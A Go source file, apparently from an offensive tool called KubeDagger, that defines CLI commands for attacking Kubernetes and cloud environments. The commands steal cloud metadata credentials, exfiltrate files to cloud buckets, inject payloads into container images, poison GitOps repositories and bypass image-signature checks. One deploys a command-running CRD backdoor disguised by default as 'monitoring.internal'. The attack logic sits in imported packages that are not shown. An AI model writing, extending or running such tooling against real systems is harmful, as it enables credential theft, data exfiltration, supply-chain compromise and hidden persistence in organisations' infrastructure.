package run

import (
	"github.com/spf13/cobra"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/cloud_exfil"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/cloud_meta"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/crd_backdoor"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/gitops_poison"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/sig_bypass"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/supply_chain"
)

var cmdCloudMeta = &cobra.Command{
	Use:   "meta",
	Short: "steal cloud metadata credentials",
	Long:  "meta queries the cloud instance metadata service (IMDS) to steal IAM/GCP/Azure credentials",
	RunE:  cloudMetaCmd,
}

var cmdCloudExfil = &cobra.Command{
	Use:   "exfil",
	Short: "exfiltrate data to cloud storage",
	Long:  "exfil uploads stolen data to S3/GCS/Azure Blob using credentials from IMDS or manual input",
	RunE:  cloudExfilCmd,
}

var cmdSupplyChain = &cobra.Command{
	Use:   "supply-chain",
	Short: "Supply chain injection",
	Long:  "supply-chain performs OCI manifest manipulation and layer injection for image supply chain attacks",
	RunE:  supplyChainCmd,
}

var cmdGitOpsPoison = &cobra.Command{
	Use:   "gitops-poison",
	Short: "GitOps repository poisoning",
	Long:  "gitops-poison targets ArgoCD/Flux sync mechanisms to inject malicious manifests into GitOps repos",
	RunE:  gitOpsPoisonCmd,
}

var cmdSigBypass = &cobra.Command{
	Use:   "sig-bypass",
	Short: "Image signature verification bypass",
	Long:  "sig-bypass bypasses Sigstore/Cosign verification by injecting trusted signatures or disabling admission",
	RunE:  sigBypassCmd,
}

var cmdCRDBackdoor = &cobra.Command{
	Use:   "crd-backdoor",
	Short: "CRD-based backdoor controller",
	Long:  "crd-backdoor deploys a legitimate-looking CRD with a controller that executes commands on reconcile",
	RunE:  crdBackdoorCmd,
}

func cloudMetaCmd(cmd *cobra.Command, args []string) error {
	result, err := cloud_meta.FetchMetadata(options.CloudProvider)
	if err != nil {
		return err
	}
	return cloud_meta.PrintResult(result)
}

func cloudExfilCmd(cmd *cobra.Command, args []string) error {
	return cloud_exfil.Execute(options.Target, options.ExfilProvider, options.ExfilBucket, options.ExfilPath, options.ExfilCredsFrom, options.Output)
}

func supplyChainCmd(cmd *cobra.Command, args []string) error {
	return supply_chain.Execute(options.Target, options.SupplyChainMode, options.SupplyTargetImage, options.SupplyPayload, options.Output)
}

func gitOpsPoisonCmd(cmd *cobra.Command, args []string) error {
	return gitops_poison.Execute(options.Target, options.GitOpsRepo, options.GitOpsTargetPath, options.GitOpsInjectImg, options.Output)
}

func sigBypassCmd(cmd *cobra.Command, args []string) error {
	return sig_bypass.Execute(options.Target, options.SigBypassMode, options.SigBypassImage, options.Output)
}

func crdBackdoorCmd(cmd *cobra.Command, args []string) error {
	return crd_backdoor.Execute(options.Target, options.CRDAction, options.CRDName, options.Output)
}

func init() {
	cmdCloudMeta.PersistentFlags().StringVar(
		&options.CloudProvider,
		"provider",
		"auto",
		"cloud provider: aws, gcp, azure, or auto")
	cmdCloud.AddCommand(cmdCloudMeta)

	cmdCloudExfil.PersistentFlags().StringVar(
		&options.ExfilProvider,
		"provider",
		"aws",
		"cloud provider: aws, gcp, or azure")
	cmdCloudExfil.PersistentFlags().StringVar(
		&options.ExfilBucket,
		"bucket",
		"",
		"target bucket/container name")
	cmdCloudExfil.PersistentFlags().StringVar(
		&options.ExfilPath,
		"path",
		"",
		"local path of file to exfiltrate")
	cmdCloudExfil.PersistentFlags().StringVar(
		&options.ExfilCredsFrom,
		"creds-from",
		"imds",
		"credential source: imds, env, or file")
	cmdCloudExfil.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	cmdCloud.AddCommand(cmdCloudExfil)
	KUBEDaggerClient.AddCommand(cmdCloud)

	cmdSupplyChain.PersistentFlags().StringVar(
		&options.SupplyChainMode,
		"mode",
		"layer-inject",
		"attack mode: layer-inject or manifest-replace")
	cmdSupplyChain.PersistentFlags().StringVar(
		&options.SupplyTargetImage,
		"target-image",
		"",
		"target container image to compromise")
	cmdSupplyChain.PersistentFlags().StringVar(
		&options.SupplyPayload,
		"payload",
		"",
		"payload path or content to inject")
	cmdSupplyChain.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdSupplyChain)

	cmdGitOpsPoison.PersistentFlags().StringVar(
		&options.GitOpsRepo,
		"repo",
		"",
		"GitOps repository URL to poison")
	cmdGitOpsPoison.PersistentFlags().StringVar(
		&options.GitOpsTargetPath,
		"target-path",
		"",
		"manifest path within repo to modify")
	cmdGitOpsPoison.PersistentFlags().StringVar(
		&options.GitOpsInjectImg,
		"inject-image",
		"",
		"image to inject into manifests")
	cmdGitOpsPoison.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdGitOpsPoison)

	cmdSigBypass.PersistentFlags().StringVar(
		&options.SigBypassMode,
		"mode",
		"inject-sig",
		"bypass mode: inject-sig or disable-verify")
	cmdSigBypass.PersistentFlags().StringVar(
		&options.SigBypassImage,
		"target-image",
		"",
		"target image for signature bypass")
	cmdSigBypass.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdSigBypass)

	cmdCRDBackdoor.PersistentFlags().StringVar(
		&options.CRDAction,
		"action",
		"deploy",
		"action: deploy, trigger, or remove")
	cmdCRDBackdoor.PersistentFlags().StringVar(
		&options.CRDName,
		"crd-name",
		"monitoring.internal",
		"CRD name for the backdoor")
	cmdCRDBackdoor.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file path (stdout if not set)")
	KUBEDaggerClient.AddCommand(cmdCRDBackdoor)
}
